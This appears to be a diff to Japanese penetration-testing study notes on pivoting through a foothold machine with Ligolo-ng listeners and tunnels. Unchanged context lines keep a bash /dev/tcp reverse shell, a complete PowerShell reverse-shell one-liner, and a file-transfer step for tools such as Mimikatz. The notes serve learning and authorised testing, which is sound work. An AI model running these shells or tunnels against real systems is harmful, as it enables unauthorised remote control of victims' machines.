@@ -227,23 +227,8 @@ ip a show
 - 用途：**ツール転送**やSMB接続、**リバースシェル接続**などの用途で使う
 	- 例えばローカルNW内のマシンに対し、攻撃者の用意したHTTPサーバー経由でMimikatzを送りたいときなど
 
+- 通信方向：ローカルNWのAgent以外のマシン → 足場マシン(Agent)のlistener → トンネル → 攻撃者マシン
 - 以下、[Tunneling w/ Ligolo-ng](#Tunneling%20w/%20Ligolo-ng)のステップ７で`start`としてから実行するものとする
-
-### Listenerセットアップ方法
-
-1. 攻撃者マシンのLigolo-ngプロンプトから、Agentに対し、Agent-listenerを立てるように設定
-```bash
-listener_add --addr 0.0.0.0:<agent_listen_port> --to 127.0.0.1:<attacker_listen_port> --tcp
-```
-- 出力：`INFO[2383] Listener 0 created on remote agent! `
-- →ターゲットからの通信をAgent経由でProxy（攻撃者マシン）に転送するようになる
-
-2. ローカルNWのAgent以外のマシン上から、Agentのリスナーポートに接続する
-	- 通信方向：ローカルNWのAgent以外のマシン → 足場マシン(Agent)のlistener → トンネル → 攻撃者マシン
-```bash
-curl http://<agent_IP>:<agent_listen_port>
-```
-- AgentIPには内部NWインターフェースのIPを指定すること
 
 ### 具体的なユースケース：リバースシェル
 
@@ -271,8 +256,10 @@ bash -i >& /dev/tcp/<agent_local_IP>/<agent_listen_port> 0>&1
 # windows
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<agent_local_IP>',<agent_listen_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
+- `agent_local_IP`には内部NWインターフェースのIPを指定
+- 関連ノート：[What is the shell](../../Common/What%20is%20the%20shell.md)
 
-4. 攻撃者のマシンでローカルNW側のマシンのリバースシェルを確立
+4. 攻撃者のマシンでローカルNW側のマシンのリバースシェルを確立される
 
 ### 具体的なユースケース：ファイル転送
 
@@ -297,9 +284,7 @@ Invoke-WebRequest -Uri http://<agent_local_IP>:<HTTP_Port>/<file> -Outfile <outp
 
 ## localhostサービスへのアクセス w/ Ligolo-ng
 
-- 用途：Agentで`localhost`でしかアクセスできないサービスにアクセスできるようにする
-	- 0.0.0.0で接続を受け付けているが、FWにより接続できないときも有効
-- 具体例：Agent上で`netstat -ano`を実行し、`127.0.0.1`でListenしているポートや、`0.0.0.0`でListenしているが攻撃者のマシンからはFWのせいで直接接続できないときなど
+- 用途：Agentで`localhost（127.0.0.1）`でしかアクセスできないサービスや、0.0.0.0で接続を受け付けているが、FWにより接続できないサービスにアクセスする
 
 1. Ligolo-ng専用のマジックCIDRを使用する
 ```zsh
